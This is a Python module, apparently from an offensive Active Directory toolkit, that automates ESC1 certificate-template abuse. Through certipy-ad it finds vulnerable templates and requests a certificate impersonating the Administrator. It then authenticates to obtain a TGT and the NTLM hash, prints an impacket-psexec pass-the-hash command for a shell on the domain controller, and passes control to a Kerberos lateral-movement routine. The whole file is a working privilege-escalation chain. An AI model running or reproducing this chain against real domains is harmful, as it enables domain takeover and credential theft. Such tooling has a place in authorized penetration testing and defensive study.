from termcolor import colored
from rich.console import Console
from rich.table import Table
import json
import os
import src.modules.krb_lateral as krb_lateral
import src.modules.core as core
import src.modules.config as config

def rename_file(cur, new):
    dir = os.getcwd()
    current = os.path.join(dir, cur)
    new_path = os.path.join(dir, new)
    os.rename(current, new_path)

def find_vuln_certs(domain, dc_ip, user, password):
    print(colored("\n[*] Looking for vulnerable certificate templates with Certipy.",'blue'))
    out, err = core.execute_command(f"certipy-ad find -u {user}@{domain} -p {password} -dc-ip {dc_ip} -vulnerable -json")
    file = None
    lines = out.split("\n")
    for line in lines:
        if "[-] Got error:" in line:
            print(colored(line.strip(), 'yellow'))
            exit(1)
        if "Saved" in line:
            temp = line.split("\'")[1]
            file = temp.strip("\'")
            rename_file(file, "cert_vuln_certs.json")
            print(colored(f"[*] Results saved to {config.out_folder}/cert_vuln_certs.json", 'green'))
    if file is None:
        print(colored("[-] No vulnerable certificates found.", 'yellow'))
        exit(1)

def identify_vuln_certs(file):
    print(colored("\n[*] Looking for template vulnerabilities.",'blue'))
    try:
        with open(file) as f:
            data = json.load(f)
    except Exception as e:
        print(colored(f"[-] Error occured: {e}",'red'))
        exit(1)
       
    print("[*] Listing Certificate Authorities. Using first one.")
    ca_count = len(data['Certificate Authorities'])
    try:
        for i in range(0,ca_count):
            print(colored('[+] ', 'green'), end='')
            print(colored(data['Certificate Authorities'][str(i)]['CA Name'], 'green'))
    except:
        print(colored("[-] No CA found!",'yellow'))
        exit(1)
    cert_auth = data['Certificate Authorities']['0']['CA Name']

    print("[*] Vulnerable certificate templates. Using first one. ")
    templ_count = len(data['Certificate Templates'])
    try:
        for i in range(0,templ_count):
            template_name = data['Certificate Templates']['{}'.format(i)]['Template Name']
            table = Table(show_lines=True, header_style="bold blue")
            table.add_column("Vuln")
            table.add_column(f"{template_name} template", justify='center')

            vulns = data['Certificate Templates']['{}'.format(i)]['[!] Vulnerabilities']
            for i in vulns:
                if i == "ESC1":
                    table.add_row(i, vulns[i], style='bold red')
                else:
                    table.add_row(i, vulns[i])
            console = Console()
            console.print(table)    
    except:
        print(colored("[-] No templates found!",'yellow'))
        exit(1)
    return cert_auth, template_name

def req_cert(domain, dc_ip, user, password, cert_auth, template_name, alt_name):
    if alt_name is None:
        alt_name = "Administrator"
    print(colored("\n[*] Trying to request a vulnerable certificate on behalf of {} user.".format(alt_name),'blue'))
    out, err = core.execute_command_in(f"certipy-ad req -u {user}@{domain} -p {password} -dc-ip {dc_ip} -ca {cert_auth} -template {template_name} -upn {alt_name}@{domain}", input='N')
    print(out.strip())
    file = None
    lines = out.split("\n")
    for line in lines:
        if "[-] Got error" in line:
            print(colored(line.strip(), 'yellow'))
            exit(1)
        if "Saved" in line:
            temp = line.split("\'")[1]
            file = temp.strip("\'")
            new_file = "cert_"+file
            rename_file(file, new_file)
            print(colored(f"[+] Success! Results saved to {config.out_folder}/{new_file}.", 'green'))
    return new_file

def cert_auth_privesc(cert_file, domain, dc_ip, alt_name):
    if alt_name is None:
        alt_name = "Administrator"
    print(colored(f"\n[*] Trying to authenticate as {alt_name}.",'blue'))
    out, err = core.execute_command(f"certipy-ad auth -pfx {cert_file} -domain {domain} -username {alt_name} -dc-ip {dc_ip}")
    file = None
    lines = out.split("\n")
    for line in lines:
        if "KRB_AP_ERR_SKEW" in line:
            print(colored("[-] Run \'synchronize\' module to synchronize time with NTP server.", 'yellow'))
            exit(1)
        if "[-] Got error" in line:
            print(colored(line.strip(), 'yellow'))
            exit(1)
        if "Saved" in line:
            temp = line.split("\'")[1]
            file = temp.strip("\'")
            new_file = "cert_"+file
            rename_file(file, new_file)
            print(colored(f"[+] Success! TGT credential cache saved to {config.out_folder}/{new_file}.", 'green'))
        if "Got hash" in line:
            print(colored(f"[+] Success! NTLM hash was retrieved for {alt_name} user: ", 'green'), end='')
            hash = line.split(':')[1].strip() + ':' + line.split(':')[2].strip()
            print(hash)
            print(colored(f"[+] Run the following command to get the {alt_name} shell: ", 'green'))
            command = f"impacket-psexec -hashes {hash} {alt_name}@{dc_ip}"
            print(colored("[+] sudo " + command, 'red')) 
    return file, hash

def cert_main(domain, dc_ip, username, password, dcname, alt_name):
    # create folder before first 'save to file' operation
    if not config.out_folder:
        core.makeworkdir()
    find_vuln_certs(domain, dc_ip, username, password)
    ca, template = identify_vuln_certs("cert_vuln_certs.json")
    if ca is None or template is None:
        return
    cert_file = req_cert(domain, dc_ip, username, password, ca, template, alt_name)
    if not cert_file:
        return
    tgt_ccache,hash = cert_auth_privesc(cert_file, domain, dc_ip, alt_name)
    if not hash and dcname: # if you have hash - just run your shell command
        krb_lateral.get_st(tgt_ccache, dcname, alt_name, domain, dc_ip) 
    